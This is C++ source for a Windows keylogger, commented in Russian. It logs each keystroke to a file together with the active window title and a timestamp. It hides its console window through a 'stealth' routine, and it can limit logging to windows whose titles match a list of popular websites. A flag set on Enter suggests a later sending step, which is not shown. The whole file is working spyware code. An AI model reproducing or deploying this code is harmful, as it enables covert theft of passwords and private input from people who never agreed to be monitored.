#pragma once
#include "Keylogger.h"


Keylogger::Keylogger() {
	
}


int Keylogger::Save(int key_stroke, int key_stroke_s)
{

	static char lastwindow[256] = "";

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // игнорим маус клики
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;
	if (foreground) {
		//получаем раскладку текущего потока
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);

	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256); // получаем имя вкладки открытого окна

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy(lastwindow, window_title);
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm); // получаем текущую дату
			string message = "\n[Window: ";
			message += window_title;
			message += " - at ";
			message += s;
			message += "]: ";
			fputs(message.c_str(), OUTPUT_FILE);
		}

	}

	std::cout << key_stroke << std::endl;//коды клавиш

	if (key_stroke == VK_BACK)
		fputs("[BACKSPACE]", OUTPUT_FILE);
	else if (key_stroke == VK_RETURN) {
		canSend = true;
		fputs("\n", OUTPUT_FILE);
	}
	else if (key_stroke == VK_SPACE)
		fputs(" ", OUTPUT_FILE);
	else if (key_stroke == VK_TAB)
		fputs("[TAB]", OUTPUT_FILE);
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fputs("[SHIFT]", OUTPUT_FILE);
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fputs("[CONTROL]", OUTPUT_FILE);
	else if (key_stroke == VK_ESCAPE)
		fputs("[ESCAPE]", OUTPUT_FILE);
	else if (key_stroke == VK_END)
		fputs("[END]", OUTPUT_FILE);
	else if (key_stroke == VK_HOME)
		fputs("[HOME]", OUTPUT_FILE);
	else if (key_stroke == VK_LEFT)
		fputs("[LEFT]", OUTPUT_FILE);
	else if (key_stroke == VK_UP)
		fputs("[UP]", OUTPUT_FILE);
	else if (key_stroke == VK_RIGHT)
		fputs("[RIGHT]", OUTPUT_FILE);
	else if (key_stroke == VK_DOWN)
		fputs("[DOWN]", OUTPUT_FILE);
	else if (key_stroke == 190 || key_stroke == 110)
		fputs(".", OUTPUT_FILE);
	else if (key_stroke == 189 || key_stroke == 109)
		fputs("-", OUTPUT_FILE);
	else if (key_stroke == 20)
		fputs("[CAPSLOCK]", OUTPUT_FILE);
	else {

		// чек caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// чек shift
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}
		WORD key;
		BYTE btKeyState[256];
		GetKeyboardState(btKeyState);
		ToAsciiEx(key_stroke, key_stroke_s, btKeyState, &key, 0, layout);

		//если нужно меняем регист
		if (!lowercase) key = tolower(key);
		fputc(char(key), OUTPUT_FILE);

	}

	// чистим буфер
	fflush(OUTPUT_FILE);
	return 0;
}



bool Keylogger::checkIfNeedToRemember() { // функция смотрит на каком сайте находится пользователь
							   // закоментить если нужно запоминать все нажатые клавиши
	char window_title[256] = "";
	DWORD threadID;
	HWND foreground = GetForegroundWindow();
	threadID = GetWindowThreadProcessId(foreground, NULL);

	GetWindowTextA(foreground, (LPSTR)window_title, 256);

	for (int i = 0; i < 10; i++) {
		if (strstr(window_title, popularPages[i]) != NULL) {
			return true;
		}
	}

	return false;
}



void Keylogger::stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // 
#endif // visible

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // скрыть консоль
#endif // invisible
}



void Keylogger::overrideFile(string fileName) {

	FILE *file = fopen(fileName.c_str(), "w");
	fclose(file);
}



